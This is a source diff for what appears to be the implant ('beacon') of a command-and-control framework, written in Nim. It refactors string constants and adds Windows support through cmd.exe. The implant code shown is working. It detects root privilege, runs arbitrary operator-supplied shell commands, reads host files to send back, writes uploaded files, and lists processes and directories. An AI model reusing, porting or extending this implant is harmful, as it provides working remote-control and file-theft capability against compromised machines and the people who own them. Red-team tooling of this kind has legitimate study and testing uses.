@@ -56,6 +56,46 @@ const
   processIdMsgTag* = "PID"
   additionalInfoMsgTag* = "ADI"
 
+  emptyString* = ""
+  zeroString* = "0"
+  alphabetChars* = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+  privilegeHigh* = "high"
+  privilegeLow* = "low"
+  okMessage* = "OK."
+  fileExistsMessage* = "File already exists."
+  fileDoesNotExistMessage* = "File doesn't exist."
+  fileReadFailureMessage* = "Failed to read file"
+  fileWriteFailureMessage* = "Failed to write file"
+  changeDirFailureMessage* = "Failed to change directory"
+  missingSleepValueMessage* = "Missing sleep value"
+  invalidSleepValueMessage* = "Invalid sleep value"
+  unknownInstructionMessage* = "Unknown instruction"
+  quotedEmptyPath* = "\"\""
+  doubleQuoteString* = "\""
+  escapedDoubleQuoteString* = "\"\""
+
+  instructionLs* = "ls"
+  instructionPs* = "ps"
+  instructionCd* = "cd"
+  instructionPwd* = "pwd"
+  instructionDownload* = "download"
+  instructionUpload* = "upload"
+  instructionRun* = "run"
+  instructionSleep* = "sleep"
+
+when defined(windows):
+  const
+    shellExecutable* = "cmd.exe"
+    shellFlag* = "/C"
+    listDirectoryCommand* = "dir "
+    processListCommand* = "tasklist"
+else:
+  const
+    shellExecutable* = "bash"
+    shellFlag* = "-c"
+    listDirectoryCommand* = "ls -la "
+    processListCommand* = "ps -aux"
+
 
 type
   C2Message* = object
@@ -93,9 +133,9 @@ type
 
 proc initBeacon*(self: Beacon) =
 
-    var alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+    var alphabet = alphabetChars
     randomize()
-    var hash = ""
+    var hash = emptyString
     for i in 0..32-1:
         hash = hash & alphabet[rand(len(alphabet)-1)]
 
@@ -119,34 +159,55 @@ proc initBeacon*(self: Beacon) =
     self.username = $login
     self.arch = hostCPU
     if gid==0 or uid==0:
-        self.privilege = "high"
+        self.privilege = privilegeHigh
     else:
-        self.privilege = "low"
+        self.privilege = privilegeLow
     self.os = hostOS
     self.sleepTimeMs = 1000
-    self.listenerHash = ""
-    self.lastProofOfLife = "0"
-    self.internalIps = ""
+    self.listenerHash = emptyString
+    self.lastProofOfLife = zeroString
+    self.internalIps = emptyString
     self.processId = $getpid()
-    self.additionalInfo = ""
-    self.xorKey = ""
+    self.additionalInfo = emptyString
+    self.xorKey = emptyString
     self.tasks = @[]
     self.taskResults = @[]
 
 
 proc encodeString(data: string): string =
   if data.len == 0:
-    return ""
+    return emptyString
   encode(data.toOpenArrayByte(0, data.high))
 
 
 proc decodeString(data: string): string =
   if data.len == 0:
-    return ""
+    return emptyString
   try:
     return decode(data)
   except CatchableError:
-    return ""
+    return emptyString
+
+
+proc quotePathForShell(path: string): string =
+  when defined(windows):
+    if path.len == 0:
+      return quotedEmptyPath
+    result = doubleQuoteString
+    for ch in path:
+      if ch == '"':
+        result.add(escapedDoubleQuoteString)
+      else:
+        result.add(ch)
+    result.add(doubleQuoteString)
+  else:
+    result = quoteShell(path)
+
+
+proc execShellCommand(command: string): string =
+  if command.len == 0:
+    return emptyString
+  execProcess(shellExecutable, args=[shellFlag, command], options={poUsePath})
 
 
 proc cmdToTasks*(self: Beacon, input: string) =
@@ -196,7 +257,7 @@ proc cmdToTasks*(self: Beacon, input: string) =
     if bundleNode.hasKey(additionalInfoMsgTag):
       self.additionalInfo = bundleNode[additionalInfoMsgTag].getStr()
 
-    let beaconHash = if bundleNode.hasKey(beaconHashMsgTag): bundleNode[beaconHashMsgTag].getStr() else: ""
+    let beaconHash = if bundleNode.hasKey(beaconHashMsgTag): bundleNode[beaconHashMsgTag].getStr() else: emptyString
     if beaconHash != self.beaconHash:
       continue
 
@@ -248,58 +309,58 @@ proc execInstruction*(self: Beacon) =
     var outputFile = task.outputFile
     var pid = task.pid
 
-    var result = ""
+    var result = emptyString
     case instruction:
-    of "ls":
+    of instructionLs:
       if cmd.len == 0:
         cmd = getCurrentDir()
-      let safeCmd = quoteShell(cmd)
-      result = execProcess("bash", args=["-c", "ls -la " & safeCmd], options={poUsePath})
-    of "ps":
-      result = execProcess("bash", args=["-c", "ps -aux"], options={poUsePath})
-    of "cd":
+      let safeCmd = quotePathForShell(cmd)
+      result = execShellCommand(listDirectoryCommand & safeCmd)
+    of instructionPs:
+      result = execShellCommand(processListCommand)
+    of instructionCd:
       try:
         setCurrentDir(cmd)
         result = getCurrentDir()
       except OSError:
-        result = "Failed to change directory"
-    of "pwd":
+        result = changeDirFailureMessage
+    of instructionPwd:
       result = getCurrentDir()
-    of "download":
+    of instructionDownload:
       if fileExists(inputFile):
         try:
           var fileHandler = open(inputFile, fmRead)
           data = fileHandler.readAll()
           fileHandler.close()
-          result = "OK."
+          result = okMessage
         except IOError:
-          result = "Failed to read file"
+          result = fileReadFailureMessage
       else:
-        result = "File doesn't exist."
-    of "upload":
+        result = fileDoesNotExistMessage
+    of instructionUpload:
       if fileExists(outputFile):
-        result = "File already exists."
+        result = fileExistsMessage
       else:
         try:
           var fileHandler = open(outputFile, fmWrite)
           fileHandler.write(data)
           fileHandler.close()
-          result = "OK."
+          result = okMessage
         except IOError:
-          result = "Failed to write file"
-    of "run":
-      result = execProcess("bash", args=["-c", cmd], options={poUsePath})
-    of "sleep":
+          result = fileWriteFailureMessage
+    of instructionRun:
+      result = execShellCommand(cmd)
+    of instructionSleep:
       if not isEmptyOrWhitespace(cmd):
         try:
           self.sleepTimeMs = parseInt(cmd) * 1000
-          result = "OK."
+          result = okMessage
         except ValueError:
-          result = "Invalid sleep value"
+          result = invalidSleepValueMessage
       else:
-        result = "Missing sleep value"
+        result = missingSleepValueMessage
     else:
-      result = "Unknown instruction"
+      result = unknownInstructionMessage
 
     var taskResult = C2Message(
       instruction: instruction,
